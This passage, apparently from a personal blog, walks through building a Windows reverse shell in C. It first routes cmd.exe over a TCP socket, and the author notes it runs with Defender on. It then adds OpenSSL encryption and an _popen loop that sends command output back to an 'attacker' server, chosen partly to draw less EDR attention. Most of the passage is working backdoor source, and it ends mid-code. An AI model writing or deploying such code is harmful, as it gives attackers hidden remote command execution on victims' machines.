server.</span></span><br><span class="line">	</span><br><span class="line">	wsocket = connect(ConnectSocket, (SOCKADDR*)&amp;clientService, <span class="keyword">sizeof</span>(clientService));</span><br><span class="line">	<span class="keyword">if</span> (wsocket == SOCKET_ERROR) &#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;connect function failed with error: %ld\n&quot;</span>, WSAGetLastError());</span><br><span class="line">		wsocket = closesocket(ConnectSocket);</span><br><span class="line">		<span class="keyword">if</span> (wsocket == SOCKET_ERROR)</span><br><span class="line">			wprintf(<span class="string">L&quot;closesocket function failed with error: %ld\n&quot;</span>, WSAGetLastError());</span><br><span class="line">		WSACleanup();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//WSAConnect(ConnectSocket, (SOCKADDR*)&amp;clientService, sizeof(clientService), NULL, NULL, NULL, NULL);</span></span><br><span class="line"></span><br><span class="line">	wprintf(<span class="string">L&quot;Connected to server.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Initial &amp;si </span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;si, <span class="number">0</span>, <span class="keyword">sizeof</span>(si));</span><br><span class="line">	</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">	si.dwFlags = STARTF_USESTDHANDLES|SW_HIDE;</span><br><span class="line">	si.hStdInput = (HANDLE)ConnectSocket;</span><br><span class="line">	si.hStdOutput = (HANDLE)ConnectSocket;</span><br><span class="line">	si.hStdError = (HANDLE)ConnectSocket;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> cmd[] = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">	LPSTR cmdline = <span class="keyword">const_cast</span>&lt;LPSTR&gt;(cmd);</span><br><span class="line">	CreateProcess(<span class="literal">NULL</span>, cmdline, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接在 defender 開啟的情況下做到 reverse shell 還是有點小小的興奮<br><img src="/img/2022/windows-reverse-shell-note/windows-reverse-shell-note_2.png" alt=""><br>感想來說…比較多還是看 MSDN 上面操作跟遇到問題後的查找，不得不說微軟除了做到工程師 friendly 之外也做到了駭客 friendly XDD，這個只是初版，有機會可以再做進階版<br>該 source code 同步放到我的 github 上<br><a target="_blank" rel="noopener" href="https://github.com/sda06407/windows-reverse-shell-practise">https://github.com/sda06407/windows-reverse-shell-practise</a></p>
<h1 id="update-with-openssl"><a href="#update-with-openssl" class="headerlink" title="update with openssl"></a>update with openssl</h1><p>之前寫的 reverse shell 存在一個小問題，就是它是透過 TCP 進行連線的，中間走的都是明文</p>
<p><img src="/img/2022/windows-reverse-shell-note/windows-reverse-shell-note_3.png" alt=""></p>
<p><img src="/img/2022/windows-reverse-shell-note/windows-reverse-shell-note_4.png" alt=""> </p>
<p>於是又有了改良款─基於 openssl 加密的 reverse shell</p>
<p>openssl 可以選擇用 visual studio 自己 compile，或是拿別人 pre-conpile 好的包來用<br>這邊因為是自用加上懶，直接找一個 預先編譯好的版本來用</p>
<p>這邊說明該如何將 openssl 匯入到 visual studio<br><img src="/img/2022/windows-reverse-shell-note/windows-reverse-shell-note_5.png" alt=""><br>C/C++ -&gt; General<br><img src="/img/2022/windows-reverse-shell-note/windows-reverse-shell-note_6.png" alt=""><br>linker -&gt; General<br><img src="/img/2022/windows-reverse-shell-note/windows-reverse-shell-note_7.png" alt=""><br>linker -&gt; input -&gt; edit<br><img src="/img/2022/windows-reverse-shell-note/windows-reverse-shell-note_8.png" alt=""> </p>
<p>加上以下四個 DLL</p>
<ul>
<li>ws2_32.lib</li>
<li>libssl.lib</li>
<li>Crypt32.lib</li>
<li>libcrypto.lib</li>
</ul>
<p><img src="/img/2022/windows-reverse-shell-note/windows-reverse-shell-note_9.png" alt=""><br>前置作業做完之後，再來就是構建 SSL 交握了</p>
<p><a target="_blank" rel="noopener" href="https://aticleworld.com/ssl-server-client-using-openssl-in-c/">參考來源</a></p>
<p>利用上面的 client 程式碼，連線到 server (attacker) 端的 openssl<br>可以構造出一個簡單的文字互傳功能，只是要稍微改成 windows 能跑的 code<br>舉個簡單例子，<code>bzero</code> 其實在 windows 並沒有這個 function，要馬改成 <code>ZeroMemory</code><br>或是改成 <code>memset</code> 或是先行 define 的方式 <code>#define bzero(b,len) (memset((b), &#39;\0&#39;, (len)), (void) 0)</code> 都可以達到一樣的效果</p>
<p>我這邊是除了的來以外，還搭配<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/72983025/why-references-to-openssl-init-crypto-are-undefined-when-i-complile-my-app-wit">這個</a> 和 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/windows/win32/winsock/complete-client-code">MSDN</a><br>下去做修改得到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WINSOCK_DEPRECATED_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/ssl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/applink.c&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="comment">//#pragma comment (lib, &quot;Mswsock.lib&quot;)</span></span><br><span class="line"><span class="comment">//#pragma comment (lib, &quot;AdvApi32.lib&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_BUFLEN 512</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FAIL    -1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"></span><br><span class="line"><span class="function">SOCKET <span class="title">OpenConnection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    SOCKET ConnectSocket = INVALID_SOCKET;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span>* <span class="title">result</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span>* <span class="title">ptr</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> <span class="title">hints</span>;</span></span><br><span class="line">    <span class="keyword">char</span> recvbuf[DEFAULT_BUFLEN];</span><br><span class="line">    <span class="keyword">int</span> iResult;</span><br><span class="line">    <span class="keyword">int</span> recvbuflen = DEFAULT_BUFLEN;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed with error: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ZeroMemory(&amp;hints, <span class="keyword">sizeof</span>(hints));</span><br><span class="line">    hints.ai_family = AF_UNSPEC;</span><br><span class="line">    hints.ai_socktype = SOCK_STREAM;</span><br><span class="line">    hints.ai_protocol = IPPROTO_TCP;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Resolve the server address and port</span></span><br><span class="line">    iResult = getaddrinfo(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;3000&quot;</span>, &amp;hints, &amp;result);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;getaddrinfo failed with error: %d\n&quot;</span>, iResult);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = result;</span><br><span class="line">    <span class="comment">// Create a SOCKET for connecting to server</span></span><br><span class="line">    ConnectSocket = socket(ptr-&gt;ai_family, ptr-&gt;ai_socktype, ptr-&gt;ai_protocol);</span><br><span class="line">    <span class="keyword">if</span> (ConnectSocket == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket failed with error: %ld\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Connect to server.</span></span><br><span class="line">    iResult = connect(ConnectSocket, ptr-&gt;ai_addr, (<span class="keyword">int</span>)ptr-&gt;ai_addrlen);</span><br><span class="line">    <span class="keyword">if</span> (iResult == SOCKET_ERROR) &#123;</span><br><span class="line">        closesocket(ConnectSocket);</span><br><span class="line">        ConnectSocket = INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ConnectSocket;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">SSL_CTX* <span class="title">InitCTX</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    OpenSSL_add_all_algorithms();  <span class="comment">/* Load cryptos, et.al. */</span></span><br><span class="line">    SSL_load_error_strings();   <span class="comment">/* Bring in and register error messages */</span></span><br><span class="line">    <span class="keyword">const</span> SSL_METHOD* method = TLSv1_2_client_method();  <span class="comment">/* Create new client-method instance */</span></span><br><span class="line">    SSL_CTX* ctx = SSL_CTX_new(method);   <span class="comment">/* Create new context */</span></span><br><span class="line">    <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ERR_print_errors_fp(<span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ctx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowCerts</span><span class="params">(SSL* ssl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    X509* cert;</span><br><span class="line">    <span class="keyword">char</span>* line;</span><br><span class="line">    cert = SSL_get_peer_certificate(ssl); <span class="comment">/* get the server&#x27;s certificate */</span></span><br><span class="line">    <span class="keyword">if</span> (cert != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Server certificates:\n&quot;</span>);</span><br><span class="line">        line = X509_NAME_oneline(X509_get_subject_name(cert), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Subject: %s\n&quot;</span>, line);</span><br><span class="line">        <span class="comment">//free(line);       /* free the malloc&#x27;ed string */</span></span><br><span class="line">        line = X509_NAME_oneline(X509_get_issuer_name(cert), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Issuer: %s\n&quot;</span>, line);</span><br><span class="line">        <span class="comment">//free(line);       /* free the malloc&#x27;ed string */</span></span><br><span class="line">        X509_free(cert);     <span class="comment">/* free the malloc&#x27;ed certificate copy */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Info: No client certificates configured.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">char</span> acClientRequest[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    SSL_library_init();</span><br><span class="line">    SSL_CTX* ctx = InitCTX();</span><br><span class="line">    <span class="keyword">int</span> server = OpenConnection();</span><br><span class="line">    SSL* ssl = SSL_new(ctx);      <span class="comment">/* create new SSL connection state */</span></span><br><span class="line">    SSL_set_fd(ssl, server);    <span class="comment">/* attach the socket descriptor */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SSL_connect(ssl) == FAIL) &#123;</span><br><span class="line">        ERR_print_errors_fp(<span class="built_in">stderr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* cpRequestMessage = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\nConnected with %s encryption\n&quot;</span>, SSL_get_cipher(ssl));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* get any certs */</span></span><br><span class="line">        ShowCerts(ssl);</span><br><span class="line">        <span class="comment">/* encrypt &amp; send message */</span></span><br><span class="line">        SSL_write(ssl, acClientRequest, <span class="built_in">strlen</span>(acClientRequest));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* get reply &amp; decrypt */</span></span><br><span class="line">        <span class="keyword">int</span> bytes = SSL_read(ssl, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">        buf[bytes] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: \&quot;%s\&quot;\n&quot;</span>, buf);</span><br><span class="line">        <span class="comment">/* release connection state */</span></span><br><span class="line">        SSL_free(ssl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* close socket */</span></span><br><span class="line">    closesocket(server);</span><br><span class="line">    <span class="comment">/* release context */</span></span><br><span class="line">    SSL_CTX_free(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果圖（記得改 ip）:<br><img src="/img/2022/windows-reverse-shell-note/windows-reverse-shell-note_11.png" alt=""> </p>
<p>做到這邊其實已經完成八成了，再來下一步是什麼呢?</p>
<p>這邊我之前一直想要嘗試的就是跟上一段基於 TCP 的 reverse shell 一樣，把 socket 的 IO 導到 <code>CreateProcess</code> 做交互，但這一步失敗了，所以後來的想法就是透過單純的文字傳送，當後門接到文字的輸入後將文字傳遞給 cmd 執行，再將結果以文字方式回傳給攻擊者，既然是單純執行 command 的話，<code>CreateProcess</code> 就顯得沒那麼必要了，一來他本身好像就是一些 EDR 的重點關注對象，二來 <code>CreateProcess</code> 可調整的部分太多了，我要的功能其實很單純，要一個一個定義好把它餵給 <code>CreateProcess</code> 有點麻煩，所以後來就開始找有沒有其他 function 可以做到執行 command 的行為，<code>system</code> 因為只會回傳 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-170">int</a> 並不會將 command 執行結果進行回傳所以不考慮，總之後來找到了 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/478898/how-do-i-execute-a-command-and-get-the-output-of-the-command-within-c-using-po">popen</a>，不過 windows 裡面要叫 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-tw/cpp/c-runtime-library/reference/popen-wpopen?view=msvc-170"><code>_popen</code></a> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">execute</span><span class="params">(<span class="keyword">char</span>* cmdline)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    FILE* pipe;</span><br><span class="line">    pipe = _popen(cmdline, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!pipe) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;popen() failed!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    </span><br><span class="line">        fgets(buffer, <span class="keyword">sizeof</span>(buffer), pipe) != <span class="literal">NULL</span>)</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">        _pclose(pipe);</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (...) &#123;</span><br><span class="line">        _pclose(pipe);</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但後來發現這個只會輸出一行，經人提點後才想起 fgets 會將換行符號當成是結束符號，老實說就連 msdn 的 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-tw/cpp/c-runtime-library/reference/popen-wpopen?view=msvc-170">example code</a> 也是教用 while 去讀 pipe 裡面的資料，所以改了一下就長這樣</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">execute</span><span class="params">(SSL* ssl, <span class="keyword">char</span>* cmdline)</span> </span>&#123;</span><br><span class="line">    FILE* pipe;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* endchar = <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="built_in">strncat</span>(cmdline, endchar, <span class="keyword">sizeof</span>(endchar));</span><br><span class="line">    pipe = _popen(cmdline, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!pipe) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;popen() failed!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// read till end of process:</span></span><br><span class="line">        <span class="keyword">while</span> (fgets(buffer, <span class="keyword">sizeof</span>(buffer), pipe) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            SSL_write(ssl, buffer, <span class="built_in">strlen</span>(buffer));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        _pclose(pipe);</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (...) &#123;</span><br><span class="line">        _pclose(pipe);</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>endchar</code> 主要是因為 <code>_popen</code> 只會回傳 stdout，並不會回傳 stderr，所以加一個 <code>2&gt;&amp;1</code> 在後面可以有效解決這個問題，<br>至於 while 裡面的 <code>SSL_write</code> 就是因為如果不馬上把它輸出的話，在下一次的迴圈 buffer 內的舊資料就會被新資料蓋掉了，不然就是我還要再定義一個動態陣列去存 command 執行的全部結果….我選擇死亡</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WINSOCK_DEPRECATED_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 